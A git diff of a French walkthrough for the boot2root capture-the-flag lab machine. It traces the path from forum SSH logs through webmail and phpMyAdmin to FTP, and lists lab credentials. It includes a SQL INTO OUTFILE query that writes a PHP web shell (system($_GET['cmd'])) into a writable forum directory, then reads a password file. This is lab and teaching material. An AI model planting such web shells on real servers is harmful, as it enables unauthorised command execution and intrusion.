@@ -5,7 +5,7 @@
 |------------|----------------------|--------------------------------------------------------------------|
 | serv       | user                 | `pass`                                                             | 
 | Forum      | lmezard              | `!q\]Ej?*5K5cy*AJ`                                                 | 
-| Mail       | laurie@borntosec.net | `!q\]Ej?*5K5cy*AJ`                                                 | 
+| Mail       | laurie@boot2root.htb | `!q\]Ej?*5K5cy*AJ`                                                 | 
 | PhpMyAdmin | root                 | `Fg-'kKXBj87E:aJ$`                                                 | 
 | FTP        | lmezard              | `G!@M6f4Eatau{sF"`                                                 | 
 | SSH        | laurie               | `330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4` | 
@@ -13,16 +13,17 @@
 | SSH        | zaz                  | `646da671ca01bb5d84dbb5fb2238dc8e`                                 | 
 
 ## Forum
-- Nous recuperons les [logs du ssh](https://192.168.1.96/forum/index.php?id=6) sur le forum 
+- Nous recuperons les [logs du ssh](https://boot2root.htb/forum/index.php?id=6) sur le forum 
 - `python3 ssh_parse.py`
 <pre>
 {'test', 'support', 'naos', 'lmezard', 'guest', 'nagios', 'ubnt', 'root', <strong>'!q\\]Ej?*5K5cy*AJ'</strong>, 'ftpuser', 'PlcmSpIp', 'adm', 'user', 'adam', 'nvdb', 'admin', 'pi'}
 </pre>
-- On se connecte avec les login `lmezard` et `!q\]Ej?*5K5cy*AJ`
+- On a maintenant un mot de passe 
+- On peut donc se connecter avec les login `lmezard` et `!q\]Ej?*5K5cy*AJ` sur le forum
 - Le mail est disponible dans les parametres de l'user
 
 ## Mail
-- On se connecte au server imap avec `laurie@borntosec.net` et `!q\]Ej?*5K5cy*AJ` avec evolution ou sur le site [webmail](https://borntosec.net/webmail/)
+- On se connecte au server imap avec `laurie@boot2root.htb` et `!q\]Ej?*5K5cy*AJ` avec evolution ou sur le site [webmail](https://boot2root.htb/webmail/)
 - Un mail est disponible
 <pre>
 Hey Laurie,
@@ -33,21 +34,37 @@ Best regards.
 </pre>
 
 ## PhpMyAdmin
-- Nous pouvons donc se connecter sur le [PhpMyAdmin](https://192.168.1.96/phpmyadmin/).
-- En changant le password de admin par celui de lmezard on peut se connecter en tant qu'admin sur le forum
-- On essaye maintenant d'inserer un code php dans le serveur web pour qu'il soit executer par celui ci
+- Nous pouvons donc se connecter sur le [PhpMyAdmin](https://boot2root.htb/phpmyadmin/).
+<!-- - En changant le password de admin par celui de lmezard on peut se connecter en tant qu'admin sur le forum -->
+- On essaye maintenant d'inserer un code php dans le serveur web pour qu'il soit executer
 - En executant cette commande sql je peux ecrire dans un fichier.
-```
+```sql
 SELECT "<?php system($_GET['cmd']); ?>" into outfile "/dir/dir/file.php"
 ```
 - En regardant le forum type sur [github](https://github.com/ilosuna/mylittleforum) et en testant tout les dossier un est accessible a l'ecriture `/var/www/forum/templates_c`
-- Dans les home un dossier est presant LOOKATME qui contient un dossier password
+```sql
+SELECT "<?php system($_GET['cmd']); ?>" into outfile "/var/www/forum/templates_c/cmd.php"
 ```
-lmezard:G!@M6f4Eatau{sF"
-```
+- Dans les home un dossier est present LOOKATME qui contient un dossier password
+<pre>
+$ ls /home
+LOOKATME
+ft_root
+laurie
+laurie@borntosec.net
+lmezard
+thor
+zaz
+$ ls /home/LOOKATME
+password
+$ cat /home/LOOKATME/password
+<strong>lmezard:G!@M6f4Eatau{sF"</strong>
+</pre>
 
 ## Lmezard FTP
-- On peut se connecter au FTP grace a ces login
+- On peut se [connecter au FTP](ftp://lmezard:G!@M6f4Eatau{sF"@boot2root.htb) grace a ce login (sur filezilla )
+
+```
 - On recupere les fichiers
 - README:
 ```
